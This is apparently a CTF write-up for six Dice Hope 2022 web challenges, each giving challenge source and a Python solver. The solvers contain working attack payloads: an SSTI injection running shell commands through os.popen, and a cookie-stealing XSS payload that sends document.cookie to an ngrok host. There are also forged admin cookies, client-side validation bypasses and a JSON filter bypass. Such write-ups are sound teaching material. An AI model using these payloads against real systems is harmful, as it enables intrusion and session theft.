# Dice Hope CTF 2022

## reverser

### Description

URL: https://reverser.mc.ax/ Source code:

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)


@app.get('/')
def index():
    result = '''
        <link rel="stylesheet" href="style.css" />
        <div class="container">
            <h1>Text Reverser</h1>
            Reverse any text... now as a web service!
            <form method="POST">
                <input type="text" name="text">
                <input type="submit" value="Reverse">
            </form>
        </div>
    '''
    return render_template_string(result)


@app.post('/')
def reverse():
    result = '''
        <link rel="stylesheet" href="style.css" />
        <div class="container">
            <h1>Text Reverser</h1>
            Reverse any text... now as a web service!
            <form method="POST">
                <input type="text" name="text">
                <input type="submit" value="Reverse">
            </form>
            <p>Output: %s</p>
        </div>
    '''
    output = request.form.get('text', '')[::-1]
    return render_template_string(result % output)

...

```

### Solve

Tried to test `}}7*7{{` (must be reversed), and confirm it contains SSTI.

Solver:

```python
import requests
import re

URL="https://reverser.mc.ax/"

def reverse(text):
    return text[::-1]

s = requests.Session()

# checking for exploit
query = "{{7*7}}"
query = reverse(query)
res = s.post(URL, data={
    "text": query,
})
# SSTI injection works here
# we just need to reverse the string, it'll get reversed again in the server
print(res.text)

query = "{{config.__class__.__init__.__globals__['os'].popen('find / -name *flag* -exec cat {} \\;').read()}}"
res = s.post(URL, data={"text":reverse(query)})
print(''.join(re.findall("Output: .*", res.text)))
```

## flag-viewer

### Description

source code:

```python
import os
import random

from server import Server

server = Server()

@server.get('/')
async def root(request):
    return (200, '''
        <title>Flag Viewer</title>
        <link rel="stylesheet" href="/style.css" />
        <div class="container">
            <h1>The Flag Viewer</h1>
            <form action="/flag" method="POST">
                <input
                    type="text"
                    name="user"
                    placeholder="Username"
                    pattern="^(?!admin).*$"
                    oninvalid="this.setCustomValidity('Name not allowed!')"
                    oninput="this.setCustomValidity('')"
                />
                <input type="submit" value="Submit" />
            </form>
            <div>%s</div>
        </div>
    ''' % (
        request.query.get('message', '').replace('<', '&lt;'),
    ))


@server.post('/flag')
async def flag(request):
    data = await request.post()
    user = data.get('user', '')

    if user != 'admin':
        return (302, '/?message=Only the "admin" user can see the flag!')

    return (302, f'/?message={os.environ.get("FLAG", "flag missing!")}')

server.run('0.0.0.0', 3000)

```

See the checking is done just via client side, we can easily bypass client filtering just by removing the method, or directly access the endpoint

### Solve

Solver:

```python
import requests

URL="https://flag-viewer.mc.ax"

# bypass client filtering
res = requests.post(URL + "/flag", data={"user": "admin"})
print(res.text)
```

## secure-page

### Description

URL: https://secure-page.mc.ax Source Code:

```python
import os

from server import Server

server = Server()


@server.get('/')
async def root(request):
    admin = request.cookies.get('admin', '')

    headers = {}
    if admin == '':
        headers['set-cookie'] = 'admin=false'

    if admin == 'true':
        return (200, '''
            <title>Secure Page</title>
            <link rel="stylesheet" href="/style.css" />
            <div class="container">
                <h1>Secure Page</h1>
                %s
            </div>
        ''' % os.environ.get('FLAG', 'flag is missing!'), headers)
    else:
        return (200, '''
            <title>Secure Page</title>
            <link rel="stylesheet" href="/style.css" />
            <div class="container">
                <h1>Secure Page</h1>
                Sorry, you must be the admin to view this content!
            </div>
        ''', headers)

server.run('0.0.0.0', 3000)
```

### Steps

Similar to the previous challenge, this one we just need to request on behalf of admin, by setting the cookies ourselves

```python
import requests

URL="https://secure-page.mc.ax"

s = requests.Session()

cookies = {"admin": "true"}
res = s.get(URL, cookies=cookies)
print(res.text)
```

## pastebin

### Description

URL: https://pastebin.mc.ax/ Source code:

```javascript
const crypto = require('crypto');
const express = require('express');
const app = express();

const pastes = new Map();
const add = (paste) => {
  const id = crypto.randomBytes(16).toString('hex');
  pastes.set(id, paste);
  return id;
};

app.use(require('body-parser').urlencoded({ extended: false }));

app.use((_req, res, next) => {
  res.set('set-cookie', `error=;expires=Thu, 01 Jan 1970 00:00:01 GMT`);
  next();
});

app.get('/', (req, res) => {
  const error = req.headers?.cookie?.match(/(?:^|; )error=(.+?)(?:;|$)/)?.[1];
  res.type('html');
  res.end(`
    <link rel="stylesheet" href="/style.css" />
    <div class="container">
        <h1>Yet Another Pastebin</h1>
        <form id="form" method="POST" action="/new">
            <textarea form="form" name="paste"></textarea>
            <input type="submit" value="Submit" />
        </form>
        <div style="color: red">${error ?? ''}</div>
    </div>
  `);
});

app.post('/new', (req, res) => {
  const paste = (req.body.paste ?? '').toString();

  if (paste.length == 0) {
    return res.redirect(`/flash?message=Paste cannot be empty!`);
  }

  if (paste.search(/<.*>/) !== -1) {
    return res.redirect(`/flash?message=Illegal characters in paste!`);
  }

  const id = add(paste);
  res.redirect(`/view/${id}`);
});

app.get('/flash', (req, res) => {
  const message = req.query.message ?? '';
  res.set('set-cookie', `error=${message}`);
  res.redirect('/');
});

app.get('/view/:id', (req, res) => {
  const id = req.params.id;
  res.type('html');
  res.end(`
    <link rel="stylesheet" href="/style.css" />
    <div class="container">
        <h1>Paste</h1>
        ${pastes.get(id) ?? 'Paste does not exist!'}
    </div>
  `);
});

app.listen(3000);

```

### Solve

From the source code and also description, my guess this challenge is XSS attack, we can take the pastebin URL and put it in admin bot that will check the links later.

From the codes, we also know that we can't have `< something something >` in the codes because of the filter on this line:

```javascript
  if (paste.search(/<.*>/) !== -1) {
    return res.redirect(`/flash?message=Illegal characters in paste!`);
  }
```

So we need to make payload that can bypass this filter, so can't use something like `<script></sciprt>`. If you go to the PayloadOfAllThings (https://github.com/swisskyrepo/PayloadsAllTheThings) you can see this payload is available `<img src=x onerror=document.location='https://xxxxxx.jp.ngrok.io?c='+document.cookie//`. We just need to incorporate this payload.

Because we need to have a listener for XSS, we need to open our server to the public, I used ngrok for that (so you don't need dedicated server for listening)

```bash
# spin up server locally at port 8000
python3 -m http.server 8000

# make local server accessible by public by using ngrok service
ngrok http 8000
```

Solver:

```python
import requests

URL="https://pastebin.mc.ax/"

s = requests.Session()
payload = "<img src=x onerror=document.location='https://xxxxxx.jp.ngrok.io?c='+document.cookie//"
res = s.post(URL+"new", data={"paste":payload})
print(res.request.url)
```

after you get the url for your XSS payload, you can paste it on the admin page, and you will receive the request from admin:

![](<../../.gitbook/assets/image (1).png>)

![](<../../.gitbook/assets/image (9).png>)

## sanity-check

### Description

URL: https://inspect-me.mc.ax

### Solve

The easiest one to solve this challenge is to install a javascript disabler or enable right click extension (I happened to get it in chrome webstore). And after that, just inspect the code, you'll be given this code.

```javascript
<script>(() => {
  const scripts = document.querySelectorAll('script');
  scripts.forEach((script) => script.remove());

  const chr = (c) => c.charCodeAt(0);

  const form = document.querySelector('form');
  form.addEventListener('submit', (event) => {
    event.preventDefault();
    const input = document.querySelector('input[type="text"]');
    const output = [];
    for (const char of input.value.split('').map(chr)) {
      if (chr('a') <= char && char <= chr('z')) {
        output.push(chr('a') + ((char - chr('a') + 13) % 26));
      } else if (chr('A') <= char && char <= chr('Z')) {
        output.push(chr('A') + ((char - chr('A') + 13) % 26));
      } else {
        output.push(char);
      }
    }
    const target = 'ubcr{pyvrag_fvqr_pyvpur}';
    if (output.map((c) => String.fromCharCode(c)).join('') === target) {
      document.querySelector('.content').textContent = 'Correct!';
    } else {
      input.removeAttribute('style');
      input.offsetWidth;
      input.style.animation = 'shake 0.25s';
    }
  });
})();
</script>
```

From the get-go, when we read/skim the codes, we know it must be ROT13, so we can take the string and decode the string.

```python
import codecs

decoded = 'ubcr{pyvrag_fvqr_pyvpur}'
print(codecs.decode(decoded, 'rot_13'))
```

## point

## Description

URL: https://point.mc.ax Source Code:

```go
type importantStuff struct {
	Whatpoint string `json:"what_point"`
}

func main() {
	flag, err := os.ReadFile("flag.txt")
	if err != nil {
		panic(err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			fmt.Fprint(w, "Hello, world")
			return
		case http.MethodPost:
			body, err := io.ReadAll(r.Body)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if strings.Contains(string(body), "what_point") || strings.Contains(string(body), "\\") {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			var whatpoint importantStuff
			err = json.Unmarshal(body, &whatpoint)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if whatpoint.Whatpoint == "that_point" {
				fmt.Fprintf(w, "Congrats! Here is the flag: %s", flag)
				return
			} else {
				fmt.Fprintf(w, "Something went wrong")
				return
			}
		default:
			fmt.Fprint(w, "Method not allowed")
			return
		}
	})

	log.Fatal(http.ListenAndServe(":8081", nil))

}
```

### Solve

Reading the golang's code, it's just simple challenge requirement, you need to send request to populate Whatpoint struct object by making a post request. We need to make object of `importantStuff` with the value of `Whatpoint` equal to `that_point`.

This problem is the easiest one but I spent the most time here! I was too paranoid with the filter:

1. we can't put `what_point` to the payload
2. we can't put `\` to the payload

I was too focus on how to bypass string `what_point` with other similar character, for example string `_` (utf 0x5F) with `＿` (utf 0x0000FF3F). But of course because of `\` filter, we can include non ASCII character, because it'll be converted to `\` character.

So, the way to bypass this filter, is just to use capital letter :/. Golang will treat capital letter the same as the lower letter. Even though the json definition of Whatpoint said `what_point`, we can input it as `What_point`, it will pass both filter, and we can get the flag.

```python
import requests

URL="https://point.mc.ax/"

s = requests.Session()
payload = {"What_point":"that_point"}
res = s.post(URL, json=payload)
print(res.text)
```
